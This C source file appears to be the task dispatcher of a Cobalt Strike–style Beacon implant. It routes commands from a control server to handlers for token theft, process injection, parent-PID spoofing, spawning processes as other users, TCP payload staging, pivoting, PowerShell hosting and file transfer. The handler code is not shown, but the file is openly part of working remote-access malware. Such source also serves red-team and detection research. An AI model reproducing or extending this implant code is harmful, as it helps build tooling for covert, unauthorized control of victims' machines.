#include "pch.h"

#include "job.h"
#include "argument.h"
#include "beacon.h"
#include "channel.h"
#include "command.h"
#include "download.h"
#include "filesystem.h"
#include "identity.h"
#include "inline_execute_object.h"
#include "link.h"
#include "network.h"
#include "self.h"
#include "spawn.h"
#include "stage.h"
#include "powershell.h"
#include "process.h"
#include "web_response.h"

void TaskDispatch(int cmd, char* buffer, int size)
{
	switch (cmd)
	{
		case COMMAND_BLOCKDLLS:
			BlockDlls(buffer, size);
			break;
		case COMMAND_INLINE_EXECUTE_OBJECT:
			InlineExecuteObject(buffer, size);
			break;
		case COMMAND_LSOCKET_BIND_LOCALHOST:
			ChannelLSocketBind(buffer, size, LOCALHOST);
			break;
		case COMMAND_LSOCKET_BIND:
			ChannelLSocketBind(buffer, size, 0);
			break;
		case COMMAND_SPAWNU_X86:
			SpawnUnder(buffer, size, TRUE);
			break;
		case COMMAND_SPAWNU_X64:
			SpawnUnder(buffer, size, FALSE);
			break;
		case COMMAND_SPAWNAS_X86:
			SpawnAsUser(buffer, size, TRUE);
			break;
		case COMMAND_SPAWNAS_X64:
			SpawnAsUser(buffer, size, FALSE);
			break;
		case COMMAND_LSOCKET_TCPPIVOT:
			ChannelLSocketTcpPivot(buffer, size);
			break;
		case COMMAND_ARGUE_ADD:
			ArgumentAdd(buffer, size);
			break;
		case COMMAND_ARGUE_REMOVE:
			ArgumentRemove(buffer, size);
			break;
		case COMMAND_ARGUE_LIST:
			ArgumentList();
			break;
		case COMMAND_TCP_CONNECT:
			LinkViaTcp(buffer, size);
			break;
		case COMMAND_PSH_HOST_TCP:
			PowershellHostTcp(buffer, size);
			break;
		case COMMAND_JOB_SPAWN_X86:
			JobSpawn(buffer, size, TRUE, TRUE);
			break;
		case COMMAND_JOB_SPAWN_X64:
			JobSpawn(buffer, size, FALSE, TRUE);
			break;
		case COMMAND_JOB_SPAWN_TOKEN_X86:
			JobSpawn(buffer, size, TRUE, FALSE);
			break;
		case COMMAND_JOB_SPAWN_TOKEN_X64:
			JobSpawn(buffer, size, FALSE, FALSE);
			break;
		case COMMAND_SPAWN_PROC_X64:
			SpawnSetTo(buffer, size, FALSE);
			break;
		case COMMAND_SPAWN_PROC_X86:
			SpawnSetTo(buffer, size, TRUE);
			break;
		case COMMAND_FILE_DRIVES:
			FilesystemDrives(buffer, size);
			break;
		case COMMAND_FILE_RM:
			FilesystemRemove(buffer, size);
			break;
		case COMMAND_WEBSERVER_LOCAL:
			WebServerLocal(buffer, size);
			break;
		case COMMAND_ELEVATE_PRE:
			IdentityElevatePre(buffer, size);
			break;
		case COMMAND_PIPE_OPEN_EXPLICIT:
			ProtocolSmbOpenExplicit(buffer);
			break;
		case COMMAND_UPLOAD_CONTINUE:
			Upload(buffer, size, "wb");
			break;
		case COMMAND_UPLOAD:
			Upload(buffer, size, "ab");
			break;
		case COMMAND_JOB_REGISTER:
			JobRegister(buffer, size, FALSE, FALSE);
			break;
		case COMMAND_JOB_REGISTER_IMPERSONATE:
			JobRegister(buffer, size, TRUE, FALSE);
			break;
		case COMMAND_JOB_REGISTER_MSGMODE:
			JobRegister(buffer, size, FALSE, TRUE);
			break;
		case COMMAND_EXECUTE_JOB:
			JobExecute(buffer, size);
			break;
		case COMMAND_RUN_UNDER_PID:
			RunUnderPid(buffer, size);
			break;
		case COMMAND_PPID:
			RunSetParentPid(buffer, size);
			break;
		case COMMAND_FILE_MOVE:
			FilesystemMove(buffer, size);
			break;
		case COMMAND_FILE_COPY:
			FilesystemCopy(buffer, size);
			break;
		case COMMAND_SETENV:
			putenv(buffer);
			break;
		case COMMAND_FILE_MKDIR:
			FilesystemMkdir(buffer, size);
			break;
		case COMMAND_STEAL_TOKEN:
			IdentityStealToken(buffer, size);
			break;
		case COMMAND_PS_LIST:
			ProcessList(buffer, size);
			break;
		case COMMAND_PS_KILL:
			ProcessKill(buffer, size);
			break;
		case COMMAND_PSH_IMPORT:
			PowershellImport(buffer, size);
			break;
		case COMMAND_RUNAS:
			RunAsUser(buffer, size);
			break;
		case COMMAND_PWD:
			FilesystemPwd();
			break;
		case COMMAND_JOB_KILL:
			JobKill(buffer, size);
			break;
		case COMMAND_JOBS:
			JobPrintAll();
			break;
		case COMMAND_PAUSE:
			Pause(buffer, size);
			break;
		case COMMAND_LOGINUSER:
			IdentityLoginUser(buffer, size);
			break;
		case COMMAND_FILE_LIST:
			FilesystemList(buffer, size);
			break;
		case COMMAND_STAGE_PAYLOAD:
			StagePayloadViaTcp(buffer, size);
			break;
		case COMMAND_LSOCKET_CLOSE:
			ChannelLSocketClose(buffer, size);
			break;
		case COMMAND_INJECT_PID_PING:
			InjectIntoPidAndPing(buffer, size, TRUE);
			break;
		case COMMAND_INJECTX64_PID_PING:
			InjectIntoPidAndPing(buffer, size, FALSE);
			break;
		case COMMAND_TOKEN_REV2SELF:
			BeaconRevertToken();
			break;
		case COMMAND_SEND:
			ChannelSend(buffer, size);
			break;
		case COMMAND_CLOSE:
			ChannelClose(buffer, size);
			break;
		case COMMAND_LISTEN:
			ChannelListen(buffer, size);
			break;
		case COMMAND_TOKEN_GETUID:
			IdentityGetUid();
			break;
		case COMMAND_PIPE_REOPEN:
			PipeReopen(buffer, size);
			break;
		case COMMAND_PIPE_CLOSE:
			PipeClose(buffer, size);
			break;
		case COMMAND_PIPE_ROUTE:
			PipeRoute(buffer, size);
			break;
		case COMMAND_CANCEL_DOWNLOAD:
			DownloadCancel(buffer, size);
			break;
		case COMMAND_INJECT_PING:
			SpawnAndPing(buffer, size, TRUE);
			break;
		case COMMAND_INJECTX64_PING:
			SpawnAndPing(buffer, size, FALSE);
			break;
		case COMMAND_CONNECT:
			ChannelConnect(buffer, size);
			break;
		case COMMAND_SPAWN_TOKEN_X86:
			Spawn(buffer, size, TRUE, FALSE);
			break;
		case COMMAND_SPAWN_TOKEN_X64:
			Spawn(buffer, size, FALSE, FALSE);
			break;
		case COMMAND_SPAWNX64:
			Spawn(buffer, size, FALSE, TRUE);
			break;
		case COMMAND_DIE:
			Die();
			break;
		case COMMAND_SLEEP:
			SleepSet(buffer, size);
			break;
		case COMMAND_CD:
			FilesystemCd(buffer, size);
			break;
		case COMMAND_EXECUTE:
			Execute(buffer, size);
			break;
		case COMMAND_DOWNLOAD:
			DownloadDo(buffer, size);
			break;
	}
}

void TaskProcess(char* buffer, int length)
{
	datap parser;
	BeaconDataParse(&parser, buffer, length);

	int remaining;
	do
	{
		int cmd = BeaconDataInt(&parser);
		int size = BeaconDataInt(&parser);
		char* data = BeaconDataPtr(&parser, size);

		remaining = BeaconDataLength(&parser);
		if (remaining < 0) // this should never happen
			return;

		TaskDispatch(cmd, data, size);
	} while (remaining > 0);

	BeaconDataZero(&parser);
}

